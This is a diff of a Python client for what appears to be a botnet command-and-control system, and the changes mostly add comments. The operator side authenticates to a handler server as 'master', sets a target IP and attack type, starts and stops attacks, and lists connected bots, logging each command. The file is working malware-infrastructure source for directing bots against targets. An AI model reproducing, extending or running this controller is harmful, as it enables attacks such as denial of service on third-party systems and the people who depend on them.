@@ -5,18 +5,21 @@ import os
 import sys
 import time
 
-RECV_BUFFER = 4096
-ENCODING = 'utf-8'
+RECV_BUFFER = 4096          # Memory buffer for recieving messages
+ENCODING = 'utf-8'          # Outgoing messages are encoded in utf-8
 
-botList = ""
+botList = ""                # List of connected bots to be recieved from handler server
 
-logString = ''
+logString = ''              # String of logged events to be written to a log file
 
 
+# addToLog takes a string s and appends it to the logstring, followed by a new line 
 def addToLog(s):
     global logString 
     logString = logString + str(s) + '\n'
 
+
+# writeLog writes the contents of the logstring to log.txt
 def writeLog():
     global logString
     print('Writing Log...')
@@ -24,14 +27,18 @@ def writeLog():
         f.write(logString)
 
 
+# The Send class is a threaded object used to send messages to the handler server based on user input
+# Initialized by passing a socket to use for sending
 class Send(threading.Thread):
 
     def __init__(self, sock: socket.socket) -> None:
         super().__init__()
-        self.sock = sock
-        self.attktype = ''
-        self.targetip = ''
+        self.sock = sock            # Socket for sending data to handler server
+        self.attktype = ''          # Record of which attack type to send to handler server
+        self.targetip = ''          # Record of target address to send to handler server
 
+
+    # showcommands displays the list of input options to the user
     def showcommands(self):
         print('\n'*2)
         print('='*10)
@@ -41,29 +48,26 @@ stopattk: ; Terminates attack if it is being executed\ndisconnect: ; Disconnects
         print('='*10)
 
 
+    # A loop which waits for user input and sends it to handler server
     def run(self):
         
         while True:
-            time.sleep(2)
-            self.showcommands()
-            print('\nEnter Command: ')
+            time.sleep(2)               # Waits before displaying commands and input prompt so any incoming messages have time to display
+            self.showcommands()         # Shows input options
+            print('\nEnter Command: ')  
             sys.stdout.flush()
-            message = sys.stdin.readline()[:-1]
+            message = sys.stdin.readline()[:-1]     # Reads input from user
 
-            if message.upper() == 'DISCONNECT:':
+            if message.upper() == 'DISCONNECT:':    # Disconnects from server if user inputs disconnect:
                 self.disconnect()
-                print('Quitting...')
-                self.sock.close()
-                os._exit(0)
-            else:
-                self.sock.sendall(message.encode(ENCODING))
-                curr_time = str(int(time.time()))
-                addToLog(f'[{curr_time}] : Sent message: {message}')
-                if message == '^C':
-                    print('message is control')
-                print(f'Sent {message} to server')            
 
-    
+            else:
+                self.sock.sendall(message.encode(ENCODING))     # Encodes and sends user input directly to server
+                curr_time = str(int(time.time()))               # Gets current unix timestamp and logs sent message
+                addToLog(f'[{curr_time}] : Sent message: {message}')
+           
+
+    # changeip() through listbot() are functions which send each respective command to server and logs the event. Used for UI buttons
     def changeip(self):
         self.sock.sendall(f'changeip:{self.targetip}'.encode(ENCODING))
         print(f'Client: sending changeip:{self.targetip}')
@@ -88,6 +92,14 @@ stopattk: ; Terminates attack if it is being executed\ndisconnect: ; Disconnects
         curr_time = str(int(time.time()))
         addToLog(f'[{curr_time}] : Stopattk Sent')
 
+    def listbot(self):
+        self.sock.sendall('listbot:'.encode(ENCODING))
+        print('Client: requesting bot list')
+        curr_time = str(int(time.time()))
+        addToLog(f'[{curr_time}] : Requested Bot List')
+   
+
+    # Closes the socket and exits the program after logging the disconnect
     def disconnect(self):
         time.sleep(1)
         print('Disconnecting...')
@@ -100,12 +112,8 @@ stopattk: ; Terminates attack if it is being executed\ndisconnect: ; Disconnects
         os._exit(0)
 
     
-    def listbot(self):
-        self.sock.sendall('listbot:'.encode(ENCODING))
-        print('Client: requesting bot list')
-        curr_time = str(int(time.time()))
-        addToLog(f'[{curr_time}] : Requested Bot List')
 
+# Receive class is a threaded object to listen for incoming messages and handle them. Initialized by passing a socket and client type (default is master)
 class Receive(threading.Thread):
 
     def __init__(self, sock: socket.socket, client_type: str, client) -> None:
@@ -115,11 +123,13 @@ class Receive(threading.Thread):
         self.client = client
         self.botlist = ''
 
+
+    # A loop which listens for incoming data, and handles it if any is received. Otherwise, determines that client has been disconnected from server and closes program.
     def run(self) -> None:
         while True:
             try:
                 recv_data = self.sock.recv(RECV_BUFFER)
-            except ConnectionResetError:
+            except ConnectionResetError:        # Handles and logs a forcibly terminated connection
                 print("An existing connection was forcibly closed by the remote host")
                 curr_time = str(int(time.time()))
                 addToLog(f'[{curr_time}] : Connection forcibly closed by remote host')
@@ -132,7 +142,7 @@ class Receive(threading.Thread):
 
 
             if recv_data:
-                self._req_handler(recv_data)
+                self._req_handler(recv_data)        # Handles received data
             else:
                 print('Disconnected from server')
                 curr_time = str(int(time.time()))
@@ -144,16 +154,18 @@ class Receive(threading.Thread):
                 writeLog()
                 os._exit(0)
 
+
+    # _req_handler takes received data in bytes as an argument
     def _req_handler(self, recv_data: bytes) -> None:
         recv_data_str = str(recv_data, ENCODING)
         try:
-            request = recv_data_str.split(':')
+            request = recv_data_str.split(':')      # Messages consist of a command followed by any relevant information, seperated by ':'. This splits the message into its request and information
             req_type = request[0]
-            if req_type == 'whoami':
+            if req_type == 'whoami':                # Server requests identification with whoami, client responds with iam:master
                 print('Sending identification...')
                 response = f'iam:{self.client_type}'.encode(ENCODING)
                 self.sock.send(response)
-            elif req_type == 'iam':
+            elif req_type == 'iam':         # If message received is iam:success, sets client as authenticated. Otherwise, authentification is failed and client terminates
                 if request[1] == 'success':
                     self.client.set_authenticated()
                 else:
@@ -166,12 +178,12 @@ class Receive(threading.Thread):
                     writeLog()
                     self.sock.close()
                     os._exit(0)
-            elif req_type == 'listbot':
+            elif req_type == 'listbot':     # Incoming messages of type listbot: are handled by displaying the list of connected bots if they exist, or displaying 'no bots connected'
                 if len(request[1]):
                     self.botlist = request[1]
                     time.sleep(1)
                     global botList
-                    botList = self.botlist
+                    botList = self.botlist  # The bot list is also stored as a global variable for use by the GUI
 
                     print(f'Bots:\n{self.botlist}')
                     curr_time = str(int(time.time()))
@@ -191,6 +203,8 @@ class Receive(threading.Thread):
             # raise e
 
 
+
+# Client class handles the creation of a socket and initiating a TCP connection to the handler server, as well as instantiating the Send and Recieve threads
 class Client:
 
     def __init__(self, host: str, port: int, type: str) -> None:
